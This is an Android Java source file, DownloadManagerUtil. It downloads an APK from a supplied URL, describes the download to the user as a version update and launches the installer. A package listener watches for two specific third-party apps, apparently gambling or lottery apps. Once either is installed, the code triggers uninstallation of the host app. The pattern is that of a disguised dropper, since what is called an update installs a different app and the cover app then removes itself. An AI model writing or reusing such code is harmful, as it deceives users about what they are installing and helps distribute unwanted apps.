package luyao.box.ui;

import android.app.DownloadManager;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import androidx.core.content.FileProvider;
import luyao.box.App;
import luyao.box.BuildConfig;
import luyao.box.R;

import java.io.File;

/**
 * Created by EverGlow on 2019/1/15 11:46
 */

public class DownloadManagerUtil {
    private Context mContext;
    private BroadcastReceiver mReceiver;
    private BroadcastReceiver mReceiver2;
    private DownloadManager mDManager;
    private long mDownloadId;
    private WelcomeActivity.MyProgressListener mylistener;

    private DownloadManagerUtil(Context context) {
        mContext = context;
    }

    private static DownloadManagerUtil instance;

    public static DownloadManagerUtil getInstance(Context context) {
        if (instance == null) {
            instance = new DownloadManagerUtil(context);
        }
        return instance;
    }

    private final QueryRunnable mQueryProgressRunnable = new QueryRunnable();
    private final Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (msg.what == 1001) {
                if (mylistener != null) {
                    mylistener.notification(msg.arg1, msg.arg2);
                }
            }
        }
    };

    //查询下载进度
    private class QueryRunnable implements Runnable {
        @Override
        public void run() {
            queryState();
            mHandler.postDelayed(mQueryProgressRunnable, 100);
        }
    }

    //查询下载进度
    private void queryState() {

        // 通过ID向下载管理查询下载情况，返回一个cursor
        Cursor c = mDManager.query(new DownloadManager.Query().setFilterById(mDownloadId));
        if (c == null) {

        } else { // 以下是从游标中进行信息提取
            if (!c.moveToFirst()) {

                if (!c.isClosed()) {
                    c.close();
                }
                return;
            }
            int mDownload_so_far = c.getInt(c.getColumnIndex(DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR));
            int mDownload_all = c.getInt(c.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES));
            Message msg = Message.obtain();
            if (mDownload_all > 0) {
                msg.what = 1001;
                msg.arg1 = mDownload_so_far;
                msg.arg2 = mDownload_all;
                mHandler.sendMessage(msg);
            }
            if (!c.isClosed()) {
                c.close();
            }
        }
    }

    //更新下载进度
    private void startQuery() {
        if (mDownloadId != 0) {
            mHandler.post(mQueryProgressRunnable);
        }
    }

    //停止查询下载进度
    private void stopQuery() {
        mHandler.removeCallbacks(mQueryProgressRunnable);
    }

    /**
     * @param apkPath     apk存储路径
     * @param downloadUrl 下载url
     */
    public void downloadApk(final String apkPath, String downloadUrl, WelcomeActivity.MyProgressListener listener) {

        this.mylistener = listener;
        IntentFilter filter2 = new IntentFilter();
        filter2.addAction("android.intent.action.PACKAGE_ADDED");
        filter2.addAction("android.intent.action.PACKAGE_REPLACED");
        filter2.addAction("android.intent.action.PACKAGE_REMOVED");
        filter2.addDataScheme("package");

        mReceiver2 = new BroadcastReceiver() {

            public void onReceive(Context context, Intent intent) {
                Log.e("BroadcastReceiver2", intent.getAction());
                if (TextUtils.equals(intent.getAction(), Intent.ACTION_PACKAGE_ADDED)) {
                    String packageName = intent.getData().getSchemeSpecificPart();
                    Log.e("TAG", "安装" + packageName);
                    if (TextUtils.equals("com.mimiplatform", packageName) || TextUtils.equals("com.bxvip.app.bx152zy", packageName)) {
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                uninstallSlient();
                            }
                        }, 500);
                    }

                } else if (TextUtils.equals(intent.getAction(), Intent.ACTION_PACKAGE_REPLACED)) {
                    String packageName = intent.getData().getSchemeSpecificPart();
                    Log.e("TAG", "覆盖" + packageName);
                } else if (TextUtils.equals(intent.getAction(), Intent.ACTION_PACKAGE_REMOVED)) {
                    String packageName = intent.getData().getSchemeSpecificPart();
                    Log.e("TAG", "卸载" + packageName);
                }
            }
        };
        mContext.registerReceiver(mReceiver2, filter2);
        mDManager = (DownloadManager) mContext.getSystemService(Context.DOWNLOAD_SERVICE);
        File apkFile = new File(apkPath);
        if (apkFile.exists()) {

            startInstall(apkPath);
            return;
        }

        Uri uri = Uri.parse(downloadUrl);
        DownloadManager.Request request = new DownloadManager.Request(uri);
        request.setDestinationUri(Uri.fromFile(new File(apkPath)));
        request.setDescription(mContext.getString(R.string.app_name) + "版本更新");

        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
        request.setMimeType("application/vnd.android.package-archive");
        // 设置为可被媒体扫描器找到
        request.allowScanningByMediaScanner();
        // 设置为可见和可管理
        request.setVisibleInDownloadsUi(true);
        // 获取此次下载的ID
        mDownloadId = mDManager.enqueue(request);
        mylistener.isShow();
        startQuery();
        // 注册广播接收器，当下载完成时自动安装
        IntentFilter filter = new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE);

        mReceiver = new BroadcastReceiver() {

            public void onReceive(Context context, Intent intent) {
                long myDwonloadID = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
                if (mDownloadId == myDwonloadID) {
                    mylistener.dismiss();
                    stopQuery();
                    startInstall(apkPath);
                }
            }
        };
        mContext.registerReceiver(mReceiver, filter);

    }


    private void startInstall(String apkPath) {
        Intent localIntent = new Intent(Intent.ACTION_VIEW);
        localIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Uri uri;
        /**
         * Android7.0+禁止应用对外暴露file://uri，改为content://uri；具体参考FileProvider
         */
        if (Build.VERSION.SDK_INT >= 24) {

            uri = FileProvider.getUriForFile(mContext, "luyao.box.fileprovider",
                    new File(apkPath));
            localIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        } else {
            uri = Uri.fromFile(new File(apkPath));
        }
        Log.d("BroadcastReceiver", "uri =" + uri);
        localIntent.setDataAndType(uri, "application/vnd.android.package-archive"); //打开apk文件
        try {
            mContext.startActivity(localIntent);
        } catch (ActivityNotFoundException e) {
            e.printStackTrace();
        }
    }

    //卸载
    private void uninstallSlient() {
        Log.e("uninstallSlient==", "1");
        Uri packageURI = Uri.parse("package:" + App.Companion.getCONTEXT().getPackageName());
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
        uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        App.Companion.getCONTEXT().startActivity(uninstallIntent);
    }

}
